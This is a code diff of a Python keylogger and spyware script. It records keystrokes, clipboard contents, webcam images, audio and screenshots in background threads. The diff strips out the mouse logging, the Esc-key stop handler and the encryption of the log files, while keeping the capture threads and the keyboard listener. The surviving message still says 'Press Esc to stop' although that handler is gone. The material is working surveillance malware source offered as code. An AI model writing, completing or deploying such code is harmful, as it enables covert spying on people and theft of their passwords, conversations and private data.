@@ -85,25 +85,6 @@ def on_press(key):
     logging.info(f"[Key Pressed] - {key}")
 
 
-# Handler for mouse click event
-def on_click(button, pressed):
-    if pressed:
-        if button == mouse.Button.left:
-            logging.info('[Mouse Click] - Left Click')
-        elif button == mouse.Button.right:
-            logging.info('[Mouse Click] - Right Click')
-        elif button == mouse.Button.middle:
-            logging.info('[Mouse Click] - Middle Click')
-
-
-# Stop the script
-def on_release(key):
-    if key == Key.esc:
-        print("Stopping the script.")
-        stop_thread.set()
-        return False
-
-
 # Audio Recording
 def Audio():
     try:
@@ -191,74 +172,42 @@ def screenshot():
         print("Screenshots could not be saved: " + str(e))
 
 
-############################################################# FILES CREATION #############################################################
-
-
-# Encrypt files
-def encrypt(file_path):
-    # Load the key from the file
-    with open('keyfile.key', 'rb') as filekey:
-        key = filekey.read()
-
-    # Load the content of the file
-    with open(file_path, 'rb') as inputfile:
-        original = inputfile.read()
-
-    # Encrypt the content
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(original)
-
-    with open(file_path, 'wb') as encrypted_file:
-        encrypted_file.write(encrypted)
 
 # Main function
 def main():
     try:
+        # Log system information
         setup_logging()
         log_system_info()
+        
+        # Start threads for clipboard, webcam, audio recording, and screenshot
+        t2 = threading.Thread(target=clipboard)
+        t3 = threading.Thread(target=webcam)
+        t4 = threading.Thread(target=Audio)
+        t5 = threading.Thread(target=screenshot)
 
-        # Start threads for clipboard, webcam, and audio recording
-
-        t1 = threading.Thread(target=clipboard)
-        t2 = threading.Thread(target=webcam)
-        t3 = threading.Thread(target=Audio)
-        t4 = threading.Thread(target=screenshot)
-        t5 = threading.Thread(target=log_system_info)
-
-
-        t1.start()
         t2.start()
         t3.start()
         t4.start()
         t5.start()
 
-
-        # Start the keyboard and mouse listeners
-        with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, \
-             mouse.Listener(on_click=on_click) as mouse_listener:
+        # Start the keyboard listener to log key presses
+        with keyboard.Listener(on_press=on_press) as key_listener:
             print("Script started. Press 'Esc' to stop.")
             key_listener.join()
-            mouse_listener.stop()
 
-        # Encrypt the LOG_FILE and CLIPBOARD
-        encrypt(LOG_FILE)
-        encrypt(CLIPBOARD)
-
-        # Print the paths of encrypted files
-        print("Encrypted LOG_FILE:", LOG_FILE)
-        print("Encrypted CLIPBOARD:", CLIPBOARD)
-
+    except KeyboardInterrupt:
+        print("Control-C entered... Program exiting")
     except Exception as e:
         logging.exception(f"An error occurred: {str(e)}")
-
     finally:
         # Ensure stop_thread is set and threads are joined
         stop_thread.set()
-        t1.join()
         t2.join()
         t3.join()
         t4.join()
         t5.join()
+
 
 if __name__ == '__main__':
     try:
@@ -266,9 +215,5 @@ if __name__ == '__main__':
             main()
         else:
             print("You forgot to generate the Key x)")
-
     except KeyboardInterrupt:
         print("Control-C entered... Program exiting")
-
-
-        
